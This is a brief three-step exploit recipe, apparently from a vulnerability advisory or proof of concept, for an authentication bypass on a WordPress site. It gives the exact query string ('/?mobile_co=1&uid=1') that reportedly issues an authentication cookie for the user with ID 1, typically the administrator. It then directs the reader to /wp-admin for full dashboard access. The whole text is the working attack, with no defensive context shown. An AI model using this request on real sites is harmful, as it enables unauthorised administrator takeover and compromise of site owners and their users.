1. Navigate to the target site and append the following query parameters to the URL to impersonate the user with ID `1`:
`/?mobile_co=1&uid=1`
2. You will now receive an authentication cookie for the specified user ID (typically, user ID `1` is the site administrator).
3. Visit `/wp-admin` â€” you should have full access to the admin dashboard.
